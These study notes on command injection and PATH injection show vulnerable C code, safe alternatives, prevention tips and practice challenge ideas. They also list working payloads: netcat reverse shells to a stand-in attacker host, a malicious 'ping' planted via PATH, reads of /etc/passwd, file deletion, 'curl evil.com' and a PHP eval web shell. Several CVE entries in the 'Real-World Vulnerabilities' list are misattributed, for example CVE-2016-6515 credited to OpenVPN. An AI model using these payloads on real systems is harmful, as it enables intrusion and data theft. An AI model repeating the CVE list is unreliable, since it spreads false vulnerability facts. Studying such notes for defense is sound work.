ðŸ“š Command Injection & Path Injection Notes
==========================================

### 1. What is Command Injection?
-----------------------------
Command Injection happens when untrusted input is passed directly to a system shell, allowing arbitrary OS commands to execute.

ðŸ§¨ Goal:
- Inject commands through vulnerable functions (e.g., system(), exec(), etc.)

2. Command Injection on Linux
-----------------------------
### âœ… Vulnerable Code (C):
**char user_input[100];**
**fgets(user_input, sizeof(user_input), stdin);**
**char command[200];**
**snprintf(command, sizeof(command), "ls %s", user_input);**
**system(command);**

### ðŸ§ª Payloads:
- **; whoami**
- **&& cat /etc/passwd**
- **| nc -e /bin/sh attacker:4444**

### ðŸ›‘ Safe Alternative:
execlp("ls", "ls", user_input, NULL);

### 3. Command Injection on Windows
-------------------------------
### âœ… Vulnerable Code (C):
**char name[100];**
**fgets(name, sizeof(name), stdin);**
**char cmd[200];**
**sprintf(cmd, "cmd.exe /c echo Hello %s", name);**
**system(cmd);**

### ðŸ§ª Payloads:
- **& calc**
- **&& whoami**
- **| powershell Invoke-WebRequest**
- **& del C:\important.txt**

### ðŸ›‘ Safe Alternative:
- **Avoid system(), ShellExecute()**
- **Use CreateProcess() with sanitized arguments**

### 4. Path Injection
-----------------
**Occurs when:**
- **Program uses binary name (e.g., "ping") without full path**
- **Attacker changes $PATH or places malicious binary first in PATH**

### ðŸ§ª Example:
**export PATH=~/evil:$PATH**
**echo -e '#!/bin/bash\nnc -e /bin/sh attacker.com 4444' > ~/evil/ping**
**chmod +x ~/evil/ping**

### **âœ… Defense:**
- **Use full path: /usr/bin/ping**
- **Sanitize PATH / drop privileges**

### 5. Dangerous APIs (by language)
-------------------------------
**C:        system(), popen(), exec*(), WinExec()**
**Python:   os.system(), subprocess, eval()**
**PHP:      exec(), system(), shell_exec()**
**Node.js:  child_process.exec()**
**Bash:     eval, backticks `command`**

### 6. Detection Techniques
-----------------------
- **Look for system() or shell calls + user input**
- **Use payloads with ; | & &&**
- **Monitor logs, behavior, abnormal output**

7. **Prevention Best Practices**
----------------------------
### âœ… Do:
- **Use safe API alternatives**
- **Whitelist or sanitize input**
- **Use full paths to binaries**
- **Drop unnecessary privileges**

### ðŸš« Donâ€™t:
- **==Concatenate input directly into shell commands==**
- **==Trust user-controlled environment variables==**

### 8. Real-World Vulnerabilities
-----------------------------
**CVE-2019-11043: PHP-FPM command injection**
**CVE-2021-41773: Apache path traversal + RCE**
**CVE-2016-6515: Command injection in OpenVPN**
**CVE-2020-10560: SaltStack shell command injection**

### 9. Payload Examples
-------------------
### Linux:
- ; whoami
- && uname -a
- `curl evil.com`

### Windows:
- & calc.exe
- | powershell Invoke-WebRequest

### Python:
- __import__("os").system("ls")

### PHP:
- eval($_GET['cmd'])

10. Challenge Ideas (Practice)
------------------------------
- EasyCmd: Echo input with system(); inject && whoami
- PingMaster: ping input; inject ; calc
- ScheduleRun: Accepts command to run via input
- PHPWebShell: GET param to system() call
- NodeExec: Uses child_process.exec() with user input

